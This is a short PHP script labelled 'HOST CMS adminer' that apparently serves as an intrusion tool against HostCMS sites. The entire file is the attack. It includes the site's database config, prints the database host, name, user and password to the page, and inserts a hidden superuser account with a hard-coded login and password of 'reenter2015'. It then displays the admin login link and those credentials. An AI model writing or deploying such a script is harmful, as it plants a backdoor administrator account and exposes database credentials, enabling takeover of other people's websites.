<?
	echo '<h1>HOST CMS adminer</h1>';
error_reporting( E_ALL );
ini_set('display_errors', 1); 
$config_file = $_SERVER['DOCUMENT_ROOT'].'/hostcmsfiles/config_db.php';
include($config_file);
echo "<br />DB_HOST = " . DB_HOST ."<br />DB_NAME = " . DB_NAME . "<br />DB_USER = " . DB_USER_NAME . "<br />DB_PASSWORD = " . DB_PASSWORD.  "<br />";

$sql_connect = mysql_connect(DB_HOST, DB_USER_NAME, DB_PASSWORD) or exit("<p style='color:red'>Can't connect to MySQL</p>");
mysql_select_db(DB_NAME) or exit("Can't connect to database");

$DB_HOST = DB_HOST;
$DB_NAME = DB_NAME;
$DB_USER_NAME = DB_USER_NAME;
$DB_PASSWORD = DB_PASSWORD;
$users = 'users';

$passMD5 = md5('reenter2015');
echo $passMD5;
	$query1 = "INSERT INTO  `$DB_NAME`.`$users` (`id`, `user_group_id`, `login`, `password`, `superuser`, `settings`, `active`, `only_access_my_own`, `read_only`, `user_id`, `deleted`) VALUES ('1366613', '3', 'reenter2015', '$passMD5', '1', '0', '1', '0', '0', '0','0');";
	$resquerytest1 = mysql_query($query1) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 
	
	$http_host = $_SERVER['HTTP_HOST'];
	echo "<br /><p style='color: green'>Everything is ok! Try to login : <a href='http://$http_host/admin/' target='_blank'>$http_host/administrator/</a></p><p style='color: green'>Login: reenter2015</p><p style='color: green'>Password: reenter2015</p>";
?>